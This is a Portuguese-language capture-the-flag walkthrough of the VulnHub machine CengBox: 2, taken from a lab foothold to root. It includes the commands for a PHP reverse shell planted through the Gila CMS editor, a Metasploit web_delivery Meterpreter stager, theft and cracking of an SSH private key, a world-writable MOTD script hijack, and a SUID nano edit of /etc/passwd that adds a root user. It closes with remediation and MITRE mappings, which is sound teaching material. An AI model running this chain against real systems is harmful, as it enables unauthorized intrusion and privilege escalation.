# CengBox: 2

FTP anonimo vazando uma nota interna ja e um sinal ruim. Descobrir que o CMS usa credenciais padrao e pior ainda. Descobrir que os scripts MOTD rodam como root e sao graveis por todos e a parte onde os defensores deveriam estar chorando, mano. CengBox: 2 aumenta a dificuldade em relacao ao antecessor encadeando seis misconfiguracoes distintas em FTP, virtual hosts, RCE via CMS, abuso de sudo, roubo de chave SSH e hijack de MOTD. Cada passo e um achado legitimo que voce vera em ambientes enterprise reais, pode ter certeza.

---

| Campo | Valor |
|---|---|
| **Nivel** | Medio |
| **VM Alvo** | CengBox: 2 (Linux, 192.168.1.104) |
| **VM Atacante** | Kali Linux 192.168.1.112 |
| **VulnHub URL** | https://www.vulnhub.com/entry/cengbox-2,486/ |
| **Tecnicas** | Enumeracao FTP anonimo, descoberta de virtual host, credenciais padrao Gila CMS, RCE via editor PHP do CMS, movimentacao lateral por sudo, roubo de chave SSH, cracking de passphrase com John, hijack de MOTD gravavel, nano SUID edicao de /etc/passwd |
| **CVEs / EDBs** | CVE-2020-5513 (Gila CMS LFI), sem CVE para misconfiguracao MOTD (falha de design) |
| **Grupos APT** | APT28 (roubo de credenciais + abuso de chave SSH), APT41 (RCE via app web para foothold) |

---

## Resumo do Ataque

```
[nmap] ---> portas 21 (FTP anon), 22 (SSH), 80 (HTTP)
             |
             v
[ftp anonymous] ---> note.txt ---> usuarios Kevin + Aaron, dica de creds padrao do CMS
             |
             v
[/etc/hosts] ---> ceng-company.vm
             |
             v
[gobuster vhost] ---> admin.ceng-company.vm ---> /gila
             |
             v
[Gila CMS] ---> kevin@ceng-company.vm:admin (creds padrao)
             |
             v
[editor de arquivo CMS] ---> editar PHP ---> reverse shell pentestmonkey
             |
             v
[listener nc] ---> reverse shell como www-data
             |
             v
[sudo -l] ---> sudo -u swartz /home/swartz/runphp.sh ---> shell PHP interativo
             |
             v
[MSF web_delivery] ---> Meterpreter como swartz
             |
             v
[/home/mitnick/.ssh/id_rsa] ---> ssh2john ---> john ---> passphrase: legend
             |
             v
[ssh mitnick] ---> user.txt
             |
             v
[pspy64s] ---> /etc/update-motd.d/ roda como root no login SSH
             |
             v
[ls -la /etc/update-motd.d/] ---> gravavel por todos
             |
             v
[echo "chmod u+s /bin/nano" >> 00-header] ---> reconectar SSH
             |
             v
[nano SUID] ---> editar /etc/passwd ---> adicionar usuario UID 0 ---> shell root
```

---

## Metodologia

1. Scan de portas e enumeracao FTP anonimo para dicas de usuarios
2. Descoberta de virtual host e subdominio para localizar CMS oculto
3. Login no Gila CMS com credenciais padrao
4. Execucao remota de codigo via editor PHP do CMS
5. Movimentacao lateral para usuario `swartz` via script PHP com sudo NOPASSWD
6. Staging de sessao Meterpreter via modulo `web_delivery`
7. Roubo de chave SSH privada do diretorio home de `mitnick`; cracking de passphrase com John
8. Escalada de privilegios via scripts MOTD graveis por todos e edicao de /etc/passwd com nano SUID

---

## Passo 1: Scan de Portas

**Contexto:** IP alvo e 192.168.1.104 em rede host-only.

```bash
netdiscover
nmap -A 192.168.1.104
```

**Saida esperada (resumida):**
```
21/tcp  open  ftp     vsftpd (anonymous login allowed)
22/tcp  open  ssh     OpenSSH
80/tcp  open  http    Apache
```

**Nota real:** FTP anonimo em uma box de producao e sinal vermelho toda vez, mano. Quase sempre e uma misconfiguracao ou um artefato de desenvolvimento esquecido.

**TTP MITRE:** T1046 - Network Service Scanning

---

## Passo 2: Enumeracao FTP Anonimo

**Contexto:** FTP permite login anonimo. Notas internas podem estar presentes.

```bash
ftp 192.168.1.104
# Usuario: Anonymous
# Senha: (em branco)
ls
get note.txt
bye
cat note.txt
```

**Conteudo da nota (parafraseado):** Referencia usuarios Kevin e Aaron; da dica de que o CMS usa credenciais padrao.

Adicionar o virtual hostname:

```bash
echo "192.168.1.104   ceng-company.vm" >> /etc/hosts
```

**Nota real:** FTP anonimo ainda vem habilitado por padrao em algumas configuracoes de vsftpd. Notas internas deixadas acessiveis em FTP anonimo sao uma misconfiguracao comum em setups legados de compartilhamento de arquivos enterprise.

**TTP MITRE:** T1083 - File and Directory Discovery, T1078.001 - Default Accounts

---

## Passo 3: Descoberta de Virtual Host e Subdominio

**Contexto:** O site principal em `http://ceng-company.vm` exibe uma pagina de manutencao. Preciso encontrar virtual hosts ocultos.

```bash
gobuster vhost -u http://ceng-company.vm/ \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt
```

**Encontrado:** `admin.ceng-company.vm`

```bash
echo "192.168.1.104   admin.ceng-company.vm" >> /etc/hosts
```

Gobuster/DirBuster em `http://admin.ceng-company.vm/` revela o caminho `/gila`.

**Nota real:** Enumeracao de virtual host e um passo critico no reconhecimento externo. Subdominios como `admin.*` ou `dev.*` frequentemente hospedam aplicacoes menos seguras com configuracoes padrao, tá ligado?

**TTP MITRE:** T1590.001 - Gather Victim Network Information: Domain Properties

---

## Passo 4: Credenciais Padrao do Gila CMS

**Contexto:** Login do Gila CMS em `http://admin.ceng-company.vm/gila/` exige um email. A nota FTP deu dica de credenciais padrao e do usuario Kevin.

- **Email:** `kevin@ceng-company.vm`
- **Senha:** `admin`

Login bem-sucedido. Credenciais padrao nunca foram alteradas. Que descuido, ixi.

**Alternativa:** Tentar `admin@ceng-company.vm:admin` ou `aaron@ceng-company.vm:admin` com base nas dicas da nota FTP.

**Nota real:** Credenciais padrao em deplois de CMS sao um achado consistente em todos os setores. A CISA e o NCSC emitiram assessorias especificamente sobre uso de credenciais padrao em CMSes enterprise e dispositivos de rede.

**TTP MITRE:** T1078.001 - Valid Accounts: Default Accounts

---

## Passo 5: Execucao Remota de Codigo via Editor PHP do CMS

**Contexto:** O painel admin do Gila CMS inclui um editor de arquivos PHP. Editar qualquer arquivo PHP com uma reverse shell da execucao direta de codigo como o processo do servidor web.

No admin do CMS, navegar ate o gerenciador de arquivos. Selecionar um arquivo PHP existente. Substituir seu conteudo pela reverse shell PHP do pentestmonkey, definindo `$ip = "192.168.1.112"` e `$port = 1234`.

Iniciar listener:

```bash
nc -lvnp 1234
```

Acessar o arquivo PHP editado no browser. Reverse shell conecta de volta.

Atualizar para TTY completo:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

**Nota real:** Editores de arquivo CMS que permitem edicao PHP em producao sao uma vulnerabilidade critica. WordPress, Joomla, Gila e dezenas de outros CMSes tem essa funcionalidade habilitada por padrao. Atacantes abusam rotineiramente disso em comprometimentos reais. Desabilite em producao imediatamente.

**TTP MITRE:** T1505.003 - Web Shell, T1190 - Exploit Public-Facing Application

---

## Passo 6: Movimentacao Lateral para `swartz` via Sudo

**Contexto:** Usuario atual e `www-data`. Preciso escalar para uma conta de usuario real.

```bash
sudo -l
```

**Saida:**
```
(swartz) NOPASSWD: /home/swartz/runphp.sh
```

O usuario web pode rodar um script interpretador PHP como `swartz` sem senha:

```bash
sudo -u swartz /home/swartz/runphp.sh
```

Isso abre um shell PHP interativo rodando como `swartz`. Pivot top esse.

**Nota real:** Regras sudo concedendo acesso NOPASSWD a scripts interpretadores sao um caminho classico de movimentacao lateral. O script nao precisa ser malicioso por si so. Uma vez que voce pode executa-lo interativamente, pode executar codigo arbitrario como o usuario alvo.

**TTP MITRE:** T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching

---

## Passo 7: Sessao Meterpreter via Web Delivery

**Contexto:** Shell PHP interativo como `swartz`. Staging de sessao Meterpreter para capacidades melhores de pos-exploracao.

Na maquina atacante:

```bash
msfconsole
use exploit/multi/script/web_delivery
set TARGET 1          # PHP
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.112
set LPORT 8888
exploit
```

Colar o stager PHP gerado no shell PHP do `swartz`. Uma sessao Meterpreter abre como `swartz`.

**TTP MITRE:** T1059.004 - Command and Scripting Interpreter: Unix Shell

---

## Passo 8: Roubo de Chave SSH e Cracking de Passphrase

**Contexto:** Meterpreter como `swartz`. Navegando pelo sistema de arquivos em busca de arquivos sensiveis de outros usuarios.

```bash
ls /home/
# jaye  mitnick  swartz

download /home/mitnick/.ssh/id_rsa /tmp/key
```

Crack da passphrase na maquina atacante:

```bash
/usr/share/john/ssh2john.py /tmp/key > /tmp/hash
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash
```

**Passphrase crackeada:** `legend`

SSH como mitnick e ler a flag de usuario:

```bash
chmod 600 /tmp/key
ssh -i /tmp/key mitnick@192.168.1.104
cat ~/user.txt
```

**Alternativa:** Se o John estiver lento, usar `hashcat -m 22931` com aceleracao GPU para cracking mais rapido.

**Nota real:** Chaves SSH privadas com passphrases fracas sao um achado persistente em ambientes enterprise. Desenvolvedores que usam chaves sem passphrase "por conveniencia" estao a um comprometimento de movimentacao lateral total por toda a infraestrutura. APT28 especificamente mira chaves SSH na fase de acesso a credenciais.

**TTP MITRE:** T1552.004 - Unsecured Credentials: Private Keys, T1110.001 - Brute Force: Password Guessing

---

## Passo 9: Escalada de Privilegios via Scripts MOTD Graveis

**Contexto:** Preciso de root a partir de `mitnick`. Monitoramento de processos revela o vetor de privesc.

Fazer upload e rodar `pspy64s` para observar execucao de processos root:

```bash
cd /tmp
wget http://192.168.1.112:8000/pspy64s
chmod +x pspy64s
./pspy64s
```

A saida do pspy mostra que scripts em `/etc/update-motd.d/` executam como root toda vez que um usuario loga via SSH.

Verificar permissoes:

```bash
ls -la /etc/update-motd.d/
# -rwxrwxrwx ... root root ... 00-header
```

Gravavel por todos. Esse e o vetor. Editar `00-header` para setar o bit SUID no nano:

```bash
nano /etc/update-motd.d/00-header
# Adicionar no final do arquivo:
chmod u+s /bin/nano
```

Disparar o MOTD reconectando via SSH:

```bash
exit
ssh -i /tmp/key mitnick@192.168.1.104

# Verificar nano SUID
ls -la /bin/nano
# -rwsr-xr-x ... /bin/nano
```

**Nota real:** Scripts MOTD em `/etc/update-motd.d/` sao executados como root pelo PAM em todo login SSH. Scripts MOTD graveis por todos sao uma misconfiguracao critica encontrada ocasionalmente em sistemas Ubuntu/Debian mal configurados. O fix e trivial: `chmod 755 /etc/update-motd.d/00-header`. Vacilou feio quem deixou isso assim.

**TTP MITRE:** T1543.001 - Create or Modify System Process: Launch Agent, T1037.001 - Boot or Logon Initialization Scripts

---

## Passo 10: Root via Edicao de /etc/passwd com Nano SUID

**Contexto:** Nano tem o bit SUID. Agora pode editar qualquer arquivo do sistema, incluindo `/etc/passwd`.

Gerar hash de senha:

```bash
openssl passwd -1 -salt user3 pass123
# $1$user3$rhnNWgG.ZknSPzLFiYZzE1
```

Editar `/etc/passwd` com nano SUID:

```bash
nano /etc/passwd
# Adicionar no final do arquivo:
# raj:$1$user3$rhnNWgG.ZknSPzLFiYZzE1:0:0:root:/root:/bin/bash
```

Salvar e trocar de usuario:

```bash
su raj
# Senha: pass123
id
# uid=0(root)
cd /root
cat root.txt
```

Shell root. GG, essa box tomou um vacilo completo.

**Alternativa:** Em vez de editar `/etc/passwd`, usar nano SUID para adicionar sua chave SSH publica em `/root/.ssh/authorized_keys`.

**Nota real:** Qualquer editor de texto com SUID pode escrever em `/etc/passwd` ou `/etc/sudoers`. O bit SUID em editores como nano, vim ou less e um achado classico do GTFOBins que nunca deveria aparecer em producao. E exatamente por isso que `sudo -l` e `find / -perm -4000` sao verificacoes padrao de pos-exploracao.

**TTP MITRE:** T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid, T1098 - Account Manipulation

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Fonte |
|---|---|---|
| Login padrao Gila CMS | `kevin@ceng-company.vm:admin` | Dica nota FTP + creds padrao |
| Passphrase SSH mitnick | `legend` | John + rockyou contra id_rsa |
| Flag de usuario | Ver ~/user.txt | Apos SSH como mitnick |
| Root via /etc/passwd | `raj:pass123` (UID 0) | Escrita nano SUID |
| Flag root | Ver /root/root.txt | Shell root |

---

## Licoes Aprendidas

| Achado | Impacto | Relevancia no Mundo Real |
|---|---|---|
| FTP anonimo expondo notas internas | Enumeracao de usuarios e dicas de credenciais | FTP anonimo ainda vem habilitado por padrao em algumas configs vsftpd; sempre desabilite salvo necessidade estrita |
| Credenciais padrao Gila CMS | Acesso admin sem nenhuma exploracao | Credenciais padrao continuam sendo um dos vetores de acesso inicial mais comuns em todos os setores |
| Editor PHP do CMS habilitando RCE | Execucao de codigo direto como processo do servidor web | Desabilite edicao de arquivos em paineis admin CMS em todos os deplois de producao |
| Sudo NOPASSWD para script interpretador PHP | Movimentacao lateral para outro usuario sem credenciais | Audite todas as regras sudo NOPASSWD; nunca conceda sudo a scripts interpretadores interativos |
| Chave SSH privada com passphrase fraca | Acesso total a conta apos crack de passphrase | Use passphrases fortes e unicas para todas as chaves SSH; rotacione pares de chaves periodicamente |
| Scripts MOTD graveis por todos executados como root | Escalada trivial de privilegios via trigger de login SSH | Scripts MOTD devem ser de propriedade e graveis apenas pelo root; verificar com `ls -la /etc/update-motd.d/` |
| Editor de texto SUID | Comprometimento total do sistema via edicao de /etc/passwd | Nunca setar o bit SUID em editores de texto; auditar binarios SUID com `find / -perm -4000` regularmente |

---

## Mapeamento MITRE ATT&CK

| Tecnica | ID | Tatica |
|---|---|---|
| Exploit Public-Facing Application | T1190 | Initial Access |
| Valid Accounts: Default Accounts | T1078.001 | Initial Access |
| Web Shell | T1505.003 | Persistence |
| Boot or Logon Initialization Scripts | T1037.001 | Persistence |
| Command and Scripting Interpreter: Unix Shell | T1059.004 | Execution |
| Network Service Scanning | T1046 | Discovery |
| File and Directory Discovery | T1083 | Discovery |
| Gather Victim Network Information: Domain Properties | T1590.001 | Reconnaissance |
| Unsecured Credentials: Private Keys | T1552.004 | Credential Access |
| Brute Force: Password Guessing | T1110.001 | Credential Access |
| Abuse Elevation Control Mechanism: Sudo | T1548.003 | Privilege Escalation |
| Abuse Elevation Control Mechanism: Setuid | T1548.001 | Privilege Escalation |
| Account Manipulation | T1098 | Persistence |
| Lateral Movement: Remote Services SSH | T1021.004 | Lateral Movement |

---

## Remediacao

### NIST CSF 2.0

| Funcao | Controle | Acao |
|---|---|---|
| PR.AC-1 | Gerenciamento de Identidades e Credenciais | Desabilitar FTP anonimo; impor credenciais fortes unicas para todas as contas |
| PR.AC-4 | Permissoes e Autorizacoes de Acesso | Auditar todas as regras sudo; remover entradas NOPASSWD para scripts interpretadores |
| DE.CM-7 | Monitoramento para Atividade Nao Autorizada | Monitorar modificacao de script MOTD; alertar em mudancas do bit SUID em binarios do sistema |
| PR.DS-1 | Protecao de Dados em Repouso | Restringir acesso a chaves SSH privadas ao usuario proprietario (`chmod 600`) |

### NIST SP 800-53

| Controle | Descricao |
|---|---|
| AC-2 | Gerenciamento de Contas (desabilitar FTP anonimo; implementar gerenciamento de ciclo de vida de contas) |
| CM-6 | Definicoes de Configuracao (desabilitar editores de arquivo CMS em producao; definir permissoes corretas no MOTD) |
| AC-6 | Menor Privilegio (restringir regras sudo; remover SUID de editores de texto) |
| IA-5 | Gerenciamento de Autenticadores (impor passphrases SSH fortes; rotacionar chaves anualmente) |
| SI-7 | Integridade de Software, Firmware e Informacoes (monitorar scripts MOTD e cron jobs para mudancas nao autorizadas) |

### CISA KEV

Credenciais padrao sao rastreadas no KEV da CISA para numerosos produtos CMS e de dispositivos de rede (ex.: CVE-2023-34362, CVE-2022-27593). Hijack de MOTD via scripts graveis por todos e documentado na orientacao de hardening Linux da CISA. Roubo de chave SSH e cracking de passphrase sao documentados na assessoria AA22-074A da CISA (atores patrocinados pelo estado russo usando roubo de credenciais SSH).

### C2M2 (Cybersecurity Capability Maturity Model)

| Dominio | Maturidade Atual | Maturidade Alvo | Lacuna |
|---|---|---|---|
| Gerenciamento de Identidade e Acesso | MIL0 (credenciais padrao, sem MFA) | MIL2 | Impor credenciais fortes unicas; MFA em paineis admin; politica de rotacao de chaves SSH |
| Gerenciamento de Ativos e Configuracoes | MIL0 (sem baseline para binarios SUID ou permissoes MOTD) | MIL2 | Scanning automatizado de benchmark CIS; alerta em desvio do baseline de permissoes |
| Gerenciamento de Ameacas e Vulnerabilidades | MIL0 (sem varredura) | MIL2 | Varreduras autenticadas mensais; SAST para configuracoes CMS |

### MITRE D3FEND

| Tecnica D3FEND | ID | Endereca |
|---|---|---|
| Credential Hardening | D3-CH | Impor politica de passphrase SSH forte |
| System Call Filtering | D3-SCF | Restringir contexto de execucao SUID |
| File Content Policies | D3-FCOP | Bloquear execucao PHP de caminhos de upload e editor do CMS |
| Process Spawn Analysis | D3-PSA | Detectar nano iniciando com EUID root |
| User Session Init Config Analysis | D3-USICA | Monitorar /etc/update-motd.d/ para modificacoes nao autorizadas |

---

## Consideracoes Finais

CengBox: 2 e uma otima box de dificuldade media que demonstra como uma cadeia de misconfiguracoes individualmente de baixa severidade soma um comprometimento total de root. Nenhuma exploracao de CVE necessaria: FTP anonimo, credenciais padrao, misconfiguracao MOTD e passphrase SSH fraca sao todas falhas de configuracao, nao bugs de software.

O passo do MOTD e a parte mais criativa dessa cadeia. A maioria dos defensores nunca pensa nos scripts MOTD como superficie de escalada de privilegios. Mas em qualquer sistema onde os scripts de `/etc/update-motd.d/` sao graveis por todos e executados pelo PAM como root no login SSH, qualquer usuario autenticado pode escalar. Verifique suas permissoes de MOTD. Serio mesmo.

Thanks guys!! (❍ᴥ❍ʋ)
